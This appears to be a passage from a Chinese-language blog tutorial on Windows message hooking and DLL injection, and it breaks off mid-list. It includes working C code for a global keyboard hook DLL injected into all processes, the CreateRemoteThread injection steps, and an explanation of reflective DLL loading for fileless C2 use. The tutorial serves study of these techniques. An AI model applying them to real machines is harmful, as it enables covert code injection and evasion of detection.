<li>OS判断哪个应用程序中发生了事件，然后从[OS message queue]中取出消息，添加到相应应用程序的[application message queue]</li>
<li>应用程序监视自身的[application message queue]，发现新添加的WM_KEYDOWN消息后，调用相应的事件处理程序处理。</li>
</ol>
<p>附带钩子的信息流：</p>
<ol>
<li>发生键盘输入事件，WM_KEYDOWN消息被添加到OS消息队列；</li>
<li>OS判断哪个应用程序发生了事件，从OS消息队列中取出消息，发送给应用程序；</li>
<li>钩子程序截取信息，对消息采取一定的动作（因钩子目的而定）；</li>
<li>如钩子程序不拦截消息，消息最终传输给应用程序，此时的消息可能经过了钩子程序的修改。</li>
</ol>
<p>SetWindowsHookEx()</p>
<p>在Windows中可以使用<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa">SetWindowsHookEx()API</a>来设置消息钩子，这个函数除了可以设置当前进程的钩子之外，它还可以设置全局钩子。全局钩子，顾名思义，即当前正在运行的进程都会被设置相应的钩子。</p>
<blockquote>
<p>Windows API作用类似是一个个功能函数。</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HHOOK <span class="title">SetWindowsHookExA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="type">int</span>       idHook,      <span class="comment">//hook type 钩子类型</span></span></span></span><br><span class="line"><span class="params"><span class="function">   HOOKPROC  lpfn,        <span class="comment">//hook procedure 回调函数地址</span></span></span></span><br><span class="line"><span class="params"><span class="function">   HINSTANCE hMod,        <span class="comment">//hook procedure所属的dll句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">   DWORD     dwThreadId   <span class="comment">//想要挂钩的线程PID</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>第一个参数表征钩子的类型，但钩子的类型是微软规定好的，你只能选一种，自己不能乱写</p>
<p>第二个参数是钩子执行程序，即当钩子勾到所需信息时运行的程序</p>
<p>第三个参数是要注入的dll句柄</p>
<p>第四个参数是想要挂载的线程ID，如果该参数为0，则表明钩子是一个全局钩子</p>
<p>HHOOK：返回值，钩子句柄，需要保留，等不使用钩子时通过UnhookWindowsHookEx函数卸载钩子。</p>
<p>idHook：钩子的拦截消息类型，选择钩子程序的拦截范围，具体值参考文章结尾的消息类型。</p>
<p>Lpfn：消息的回调函数地址，钩子子程的地址指针，一般是填函数名。</p>
<p>hMod：钩子函数所在的实例的句柄。对于线程钩子，该参数为NULL；对于系统钩子，该参数为钩子函数所在的DLL句柄。在dll中可通过AfxInitExtensionModule(MousehookDLL, hInstance)获得DLL句柄。</p>
<p>dwThreadId：钩子所监视的线程的线程号，可通过GetCurrentThreadId()获得线程号。对于全局钩子，该参数为NULL(或0)。</p>
<p>使用SetWindowsHookEx()设置好钩子后，在某个进程中生成指定消息时，OS会将相关的DLL文件强制注入相应的进程，然后调用注册的钩子过程。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260216175809205.png" alt="image-20260216175809205"></p>
<p>KeyHook.dll文件是一个含有钩子过程（KeyboardProc）的DLL文件，HookMain.exe是最先加载KeyHook.dll并安装键盘钩子的程序。HookMain.exe加载KeyHook.dll后使用SetWindowsHookEx()安装键盘钩子；若其他进程（如图中所示）发生键盘输入事件，OS就会强制将KeyHook.dll加载到像一个进程的内存，然后调用KeyboardProc()函数。</p>
<p>keyHook.cpp</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//KeyHook.cpp</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//定义目标进程名为notepad.exe</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_PROCESS_NAME <span class="string">&quot;notepad.exe&quot;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//定义全局变量</span></span><br><span class="line">HINSTANCE g_hInstance = <span class="literal">NULL</span>;</span><br><span class="line">HHOOK g_hHook = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//DllMain()函数在DLL被加载到进程后会自动执行</span></span><br><span class="line">BOOL WINAPI <span class="title function_">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)</span>&#123;</span><br><span class="line">	<span class="keyword">switch</span>( dwReason )&#123;</span><br><span class="line">		<span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">			g_hInstance = hinstDLL;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"> </span><br><span class="line">		<span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//</span></span><br><span class="line">LRESULT CALLBACK <span class="title function_">KeyboardProc</span><span class="params">(<span class="type">int</span> nCode, WPARAM wParam, LPARAM lParam)</span>&#123;</span><br><span class="line">	<span class="type">char</span> szPath[MAX_PATH] = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line">	<span class="type">char</span> *p = <span class="literal">NULL</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>( nCode &gt;= <span class="number">0</span> )&#123;</span><br><span class="line"> </span><br><span class="line">		<span class="comment">//释放键盘按键时，bit 31 : 0 =&gt; press, 1 =&gt; release</span></span><br><span class="line">		<span class="keyword">if</span>(!(lParam &amp; <span class="number">0x80000000</span>) )&#123;</span><br><span class="line">			GetModuleFileNameA(<span class="literal">NULL</span>, szPath, MAX_PATH);</span><br><span class="line">			p = <span class="built_in">strrchr</span>(szPath, <span class="string">&#x27;\\&#x27;</span>);</span><br><span class="line"> </span><br><span class="line">			<span class="comment">// 比较当前进程名称，若为notepad.exe，则消息不会传递给应用程序或下一个钩子函数</span></span><br><span class="line">			<span class="comment">// _stricmp()函数用于比较字符串，i表示不区分大小写，若两个值相等则返回0</span></span><br><span class="line">			<span class="keyword">if</span>( !_stricmp(p + <span class="number">1</span>, DEF_PROCESS_NAME) )&#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	<span class="comment">//比较当前进程名称，若非notepad.exe，则消息传递给应用程序或下一个钩子函数</span></span><br><span class="line">	<span class="keyword">return</span> CallNextHookEx(g_hHook, nCode, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//在C++中调用C的库文件，用extern &quot;C&quot;告知编译器，因为C++支持函数重载而C不支持，两者的编译规则不同</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span>&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">//__declspec，针对编译器的关键字，用于指出导出函数</span></span><br><span class="line">	<span class="comment">//当调用导出函数HookStart()时，SetWindowsHookEx()函数就会将KeyboardProc()添加到键盘钩链</span></span><br><span class="line">	__declspec(dllexport) <span class="type">void</span> <span class="title function_">HookStart</span><span class="params">()</span>&#123;</span><br><span class="line">		g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, <span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	__declspec(dllexport) <span class="type">void</span> <span class="title function_">HookStop</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(g_hHook)&#123;</span><br><span class="line">			UnhookWindowsHookEx(g_hHook);</span><br><span class="line">			g_hHook = <span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>因为要生成的是KeyHook.dll文件，因而在开始创建项目时应先选择Win 32控制台应用程序</p>
<p>当调用导出函数HookStart()时，SetWindowsHookEx()函数就会将KeyboardProc()添加到键盘钩链。安装好键盘钩子后，无论哪个进程，只要发生键盘输入事件，OS都会强制将KeyHook.dll注入相应的进程中。</p>
<p>KeyboardProc()函数中发生键盘输入事件时，会比较当前进程名称和“notepad.exe”是否一致，若一致则返回1，终止KeyboardProc()函数，即截获并删除消息，从而实现对notepad.exe程序的键盘输入事件进行钩取并截获删除、键盘消息不能传递到notepad.exe的消息队列中。</p>
<p>KeyboardProc()函数定义如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LRESULT CALLBACK <span class="title function_">KeyboardProc</span><span class="params">(</span></span><br><span class="line"><span class="params">    <span class="type">int</span> code,			//HC_ACTION(<span class="number">0</span>)</span>, HC_NOREMOVE(<span class="number">3</span>)</span><br><span class="line">    WPARAM wParam,		<span class="comment">//virtual-key code</span></span><br><span class="line">    LPARAM lParam		<span class="comment">//extra information</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>其中wParam指用户按下的键盘按键的虚拟键值。</p>
<p>HookMain.cpp</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//HookMain</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="comment">//Console Input/Output，定义了通过控制台进行数据输入和数据输出的函数</span></span><br><span class="line"><span class="comment">//主要是一些用户通过按键盘产生的对应操作，比如getch()函数等等</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;conio.h&quot;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//定义一些常量</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_DLL_NAME <span class="string">&quot;KeyHook.dll&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_HOOKSTART <span class="string">&quot;HookStart&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_HOOKSTOP <span class="string">&quot;HookStop&quot;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//定义两个参数为空、返回值为void即没有的函数指针</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*PFN_HOOKSTART)</span><span class="params">()</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*PFN_HOOKSTOP)</span><span class="params">()</span>;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="comment">//定义及初始化句柄变量和函数指针</span></span><br><span class="line">	HMODULE hDll = <span class="literal">NULL</span>;</span><br><span class="line">	PFN_HOOKSTART HookStart = <span class="literal">NULL</span>;</span><br><span class="line">	PFN_HOOKSTOP HookStop = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line">	<span class="comment">//加载KeyHook.dll</span></span><br><span class="line">	hDll = LoadLibraryA(DEF_DLL_NAME);</span><br><span class="line"> </span><br><span class="line">	<span class="comment">//若加载不成功，则输出错误信息</span></span><br><span class="line">	<span class="keyword">if</span>( hDll == <span class="literal">NULL</span> )&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[-]无法加载%s [%d]\n&quot;</span>, DEF_DLL_NAME, GetLastError());</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	<span class="comment">//获取导出函数地址</span></span><br><span class="line">	HookStart = (PFN_HOOKSTART)GetProcAddress(hDll, DEF_HOOKSTART);</span><br><span class="line">	HookStop = (PFN_HOOKSTOP)GetProcAddress(hDll, DEF_HOOKSTOP);</span><br><span class="line"> </span><br><span class="line">	<span class="comment">//开始钩取</span></span><br><span class="line">	HookStart();</span><br><span class="line"> </span><br><span class="line">	<span class="comment">//直至用户输入“q”退出钩取</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*]等待输入 &#x27;q&#x27; 来停止钩取...\n&quot;</span>);</span><br><span class="line">	<span class="keyword">while</span>( _getch() != <span class="string">&#x27;q&#x27;</span> );</span><br><span class="line"> </span><br><span class="line">	<span class="comment">//终止钩取</span></span><br><span class="line">	HookStop();</span><br><span class="line"> </span><br><span class="line">	<span class="comment">//卸载KeyHook.dll</span></span><br><span class="line">	FreeLibrary(hDll);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>安装好键盘钩子后，无论在哪个进程中，只要发生了键盘输入事件，OS就会强制将<strong>KeyHook.dll</strong>注入到进程中，加载了KeyHook.dll的进程，发生键盘事件时会首先调用执行**KeyHook.KetyboardProc()**。</p>
<p>KetyboardProc()函数中发生键盘输入事件时，会比较当前进程的名称与“notepad.exe”是否相同，相同返回1，终止KetyboardProc()函数，意味着截获并删除了消息，这样键盘消息就不会传递到notepad.exe程序的消息队列。</p>
<h1 id="反射DLL注入"><a href="#反射DLL注入" class="headerlink" title="反射DLL注入"></a>反射DLL注入</h1><p>其他注入方式<a target="_blank" rel="noopener" href="https://blog.csdn.net/fuhanghang/article/details/83795769">多种DLL注入技术原理介绍_dll注入器-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/14076">反射DLL注入原理解析-先知社区</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/endpoint/422011.html">反射DLL注入技术深度解析与实战 - FreeBuf网络安全行业门户</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/12996">PEB及其武器化-先知社区</a></p>
<p>普通DLL注入通过操作目标进程内存空间，强制加载外部DLL文件。核心流程如下：</p>
<ol>
<li><strong>获取目标进程句柄</strong>：<code>OpenProcess</code></li>
<li><strong>分配内存写入DLL路径</strong>：<code>VirtualAllocEx</code>+ <code>WriteProcessMemory</code></li>
<li><strong>创建远程线程执行加载</strong>：<code>CreateRemoteThread</code>调用<code>LoadLibrary</code></li>
<li><strong>清理资源</strong>：释放内存并关闭句柄</li>
</ol>
<p><strong>技术局限</strong>：</p>
<ul>
<li>依赖<code>LoadLibrary</code>等敏感API</li>
<li>需要磁盘DLL文件落地</li>
<li>容易被行为分析检测</li>
</ul>
<p>普通 DLL 注入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">让目标进程调用 LoadLibrary</span><br></pre></td></tr></table></figure>

<p>反射 DLL 注入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">让目标进程执行自定义 PE 加载器</span><br></pre></td></tr></table></figure>

<blockquote>
<p>PE Loader当双击一个 exe 时真正发生的是,ntdll.dll 里的 Loader</p>
<p>具体函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LdrLoadDll</span><br><span class="line">LdrpLoadDll</span><br></pre></td></tr></table></figure>

<p>这套机制统称为：PE Loader</p>
</blockquote>
<p>当系统加载一个 DLL 时，Loader 会做下面这些事：</p>
<p>① 分配内存</p>
<p>根据 PE 头里的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SizeOfImage</span><br><span class="line">ImageBase</span><br></pre></td></tr></table></figure>

<p>在内存中分配一块空间。</p>
<p>② 复制节区（Sections）</p>
<p>比如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text</span><br><span class="line">.data</span><br><span class="line">.rdata</span><br></pre></td></tr></table></figure>

<p>把文件里的节区拷贝到内存中对应位置。</p>
<p>③ 处理重定位（Relocation）</p>
<p>如果 DLL 没加载到默认 ImageBase：就根据重定位表修正地址</p>
<p>④ 修复导入表（IAT）</p>
<p>如果你的 DLL 里有：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MessageBox()</span><br><span class="line">CreateFile()</span><br></pre></td></tr></table></figure>

<p>它会：找到 user32.dll kernel32.dll获取函数地址填入 IAT</p>
<p>⑤ 调用入口点</p>
<p>对于 DLL：DllMain(DLL_PROCESS_ATTACH)</p>
<p>对于 EXE：EntryPoint()</p>
<p><strong>反射DLL注入原理</strong></p>
<p>copy from <a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/14076">反射DLL注入原理解析-先知社区</a></p>
<p>通过 DLL 内部的一个函数来自己把自己加载起来，这么说可能会有一点抽象，总之这个函数会负责解析DLL文件的头信息、导入函数的地址、处理重定位等初始化操作，先不用理解这个函数是怎么实现的，后面会细说，我们只需要将这个DLL文件写入目标进程的虚拟空间中，然后通过DLL的导出表找到这个ReflectiveLoader并调用它，我们的任务就完成了。</p>
<p>那么我们的任务就到了如何编写这个函数上面了，由于这个函数执行的时候 DLL 还没有被加载，这个函数的编写也会受到诸多限制，比如说无法正常使用全局变量，还有我们的函数必须编写成与地址无关的函数，就像 shellcode 那样，无论加载到了内存中的哪一个位置都要保证成功加载。</p>
<p>这个技术也是非常实用的，除了进行注入，我们在开发 c2 时也可以利用此技术实现无文件落地攻击。要理解这个技术需要丰富的 PE 知识</p>
<p>接下来要分析的项目是<a target="_blank" rel="noopener" href="https://github.com/oldboy21/RflDllOb%EF%BC%8C%E5%AE%83%E5%AE%9E%E7%8E%B0%E4%BA%86%E4%B8%80%E4%B8%AA%E4%BC%AA">https://github.com/oldboy21/RflDllOb，它实现了一个伪</a> c2 的无文件落地攻击，项目分成两个部分，一个是ReflectiveDLL，就是我们上面说的 dll，还有一个就是ReflectiveDLLInjector，它实现了从 url 下载ReflectiveDLL 并且注入到指定线程中，实现无文件落地攻击的技术。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260217215704375.png" alt="image-20260217215704375"></p>
<h2 id="ReflectiveDLL"><a href="#ReflectiveDLL" class="headerlink" title="ReflectiveDLL"></a>ReflectiveDLL</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260217215852389.png" alt="image-20260217215852389"></p>
<h3 id="变量定义"><a href="#变量定义" class="headerlink" title="变量定义"></a>变量定义</h3><p>反射DLL被当成一段裸内存写进目标进程,然后直接跳转到 ReflectiveLoader,在未知基址执行</p>
<p>也就是说：代码必须能在“任意地址”运行</p>
<p>这叫：Position Independent Code（位置无关代码）</p>
<p>写：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char kernel32[] = &quot;kernel32.dll&quot;;</span><br></pre></td></tr></table></figure>

<p>编译器会把这个字符串放到 <code>.rdata</code> 或 <code>.data</code> 段,代码里使用的是绝对地址引用</p>
<blockquote>
<p>PE 文件里的绝对地址通常是：<strong>ImageBase + 偏移量</strong></p>
<p>如果 ImageBase 变了，那就必须重定位。</p>
<p>重定位，系统会：</p>
<ol>
<li>读取重定位表</li>
<li>找到所有“需要修正的地址”</li>
<li>把原地址 + (新基址 - 旧基址)算出来</li>
</ol>
<p>如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">新基址 = 0x20000000</span><br><span class="line">旧基址 = 0x10000000</span><br><span class="line">差值   = 0x10000000</span><br></pre></td></tr></table></figure>
</blockquote>
<p>在编译时编译器不知道你未来会加载到哪里，都会按ImageBase + 偏移来生成机器码。</p>
<p>正常 LoadLibrary 加载顺序</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">系统 Loader：</span><br><span class="line">1️⃣ 分配目标内存（SizeOfImage）</span><br><span class="line">2️⃣ 拷贝节区</span><br><span class="line">3️⃣ 处理重定位</span><br><span class="line">4️⃣ 修复 IAT</span><br><span class="line">5️⃣ 调用 DllMain</span><br></pre></td></tr></table></figure>

<p>注意：重定位发生在代码执行之前</p>
<p>反射 DLL 的加载顺序</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1️⃣ 把整个 DLL 文件当作“数据”</span><br><span class="line">    写入目标进程某块内存</span><br><span class="line"></span><br><span class="line">2️⃣ 直接跳转到 ReflectiveLoader（还在原始文件布局里）</span><br><span class="line"></span><br><span class="line">3️⃣ 由 ReflectiveLoader：</span><br><span class="line">    - 解析 PE 头</span><br><span class="line">    - 分配新内存</span><br><span class="line">    - 拷贝节区</span><br><span class="line">    - 处理重定位</span><br><span class="line">    - 修复 IAT</span><br><span class="line">    - 再跳到真正入口点</span><br></pre></td></tr></table></figure>

<p>类似shellcode</p>
<p>反射 DLL 不依赖系统 Loader,而系统 Loader 本来负责,现在不用 LoadLibrary 了,只能自己处理</p>
<p>首先我们在ReflectiveFunction 函数开头可以看到下面这样的声明，还记得我们在上面说的无法使用全局变量吗，这意味着我们所有的变量都必须是堆栈变量(全局变量会产生绝对地址，执行会出问题)。堆栈变量不会最终出现在编译的代码部分（需要重新定位的位置），但始终使用堆栈指针的相对偏移量进行寻址。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">WCHAR kernel32[] = &#123; L&#x27;K&#x27;, L&#x27;e&#x27;, L&#x27;r&#x27;, L&#x27;n&#x27;, L&#x27;e&#x27;, L&#x27;l&#x27;, L&#x27;3&#x27;, L&#x27;2&#x27;, L&#x27;.&#x27;, L&#x27;d&#x27;, L&#x27;l&#x27;, L&#x27;l&#x27;, L&#x27;\0&#x27; &#125;;</span><br><span class="line">    WCHAR ntdll[] = &#123; L&#x27;n&#x27;, L&#x27;t&#x27;, L&#x27;d&#x27;, L&#x27;l&#x27;, L&#x27;l&#x27;, L&#x27;.&#x27;, L&#x27;d&#x27;, L&#x27;l&#x27;, L&#x27;l&#x27;, L&#x27;\0&#x27; &#125;;</span><br><span class="line">    WCHAR user32[] = &#123; L&#x27;U&#x27;, L&#x27;s&#x27;, L&#x27;e&#x27;, L&#x27;r&#x27;, L&#x27;3&#x27;, L&#x27;2&#x27;, L&#x27;.&#x27;, L&#x27;d&#x27;, L&#x27;l&#x27;, L&#x27;l&#x27;, L&#x27;\0&#x27; &#125;;</span><br><span class="line">    CHAR virtualAlloc[] = &#123; &#x27;V&#x27;, &#x27;i&#x27;, &#x27;r&#x27;, &#x27;t&#x27;, &#x27;u&#x27;, &#x27;a&#x27;, &#x27;l&#x27;, &#x27;A&#x27;, &#x27;l&#x27;, &#x27;l&#x27;, &#x27;o&#x27;, &#x27;c&#x27;, &#x27;\0&#x27; &#125;;</span><br><span class="line">    CHAR virtualProtect[] = &#123; &#x27;V&#x27;, &#x27;i&#x27;, &#x27;r&#x27;, &#x27;t&#x27;, &#x27;u&#x27;, &#x27;a&#x27;, &#x27;l&#x27;, &#x27;P&#x27;, &#x27;r&#x27;, &#x27;o&#x27;, &#x27;t&#x27;, &#x27;e&#x27;, &#x27;c&#x27;, &#x27;t&#x27;, &#x27;\0&#x27; &#125;;</span><br><span class="line">    CHAR rtladdFunctionTable[] = &#123; &#x27;R&#x27;, &#x27;t&#x27;, &#x27;l&#x27;, &#x27;A&#x27;, &#x27;d&#x27;, &#x27;d&#x27;, &#x27;F&#x27;, &#x27;u&#x27;, &#x27;n&#x27;, &#x27;c&#x27;, &#x27;t&#x27;, &#x27;i&#x27;, &#x27;o&#x27;, &#x27;n&#x27;, &#x27;T&#x27;, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;l&#x27;, &#x27;e&#x27;, &#x27;\0&#x27; &#125;;</span><br><span class="line">    CHAR ntFlushInstructionCache[] = &#123; &#x27;N&#x27;, &#x27;t&#x27;, &#x27;F&#x27;, &#x27;l&#x27;, &#x27;u&#x27;, &#x27;s&#x27;, &#x27;h&#x27;, &#x27;I&#x27;, &#x27;n&#x27;, &#x27;s&#x27;, &#x27;t&#x27;, &#x27;r&#x27;, &#x27;u&#x27;, &#x27;c&#x27;, &#x27;t&#x27;, &#x27;i&#x27;, &#x27;o&#x27;, &#x27;n&#x27;, &#x27;C&#x27;, &#x27;a&#x27;, &#x27;c&#x27;, &#x27;h&#x27;, &#x27;e&#x27;, &#x27;\0&#x27; &#125;;</span><br><span class="line">    CHAR loadLibraryA[] = &#123; &#x27;L&#x27;, &#x27;o&#x27;, &#x27;a&#x27;, &#x27;d&#x27;, &#x27;L&#x27;, &#x27;i&#x27;, &#x27;b&#x27;, &#x27;r&#x27;, &#x27;a&#x27;, &#x27;r&#x27;, &#x27;y&#x27;, &#x27;A&#x27;, &#x27;\0&#x27; &#125;;</span><br></pre></td></tr></table></figure>

<p>像上面这样声明我们的字符串将使编译器在运行时将这些单个字符推送到堆栈上。因此，区别在于初始化风格，定义单个字符与使用字符串文本，前者产生堆栈分配的数组，而后者产生在可执行文件的初始化数据部分中分配的数组。</p>
<h3 id="获取所需系统-api"><a href="#获取所需系统-api" class="headerlink" title="获取所需系统 api"></a>获取所需系统 api</h3><p>反射&#x2F;手动映射早期阶段经常处于这种状态：</p>
<ul>
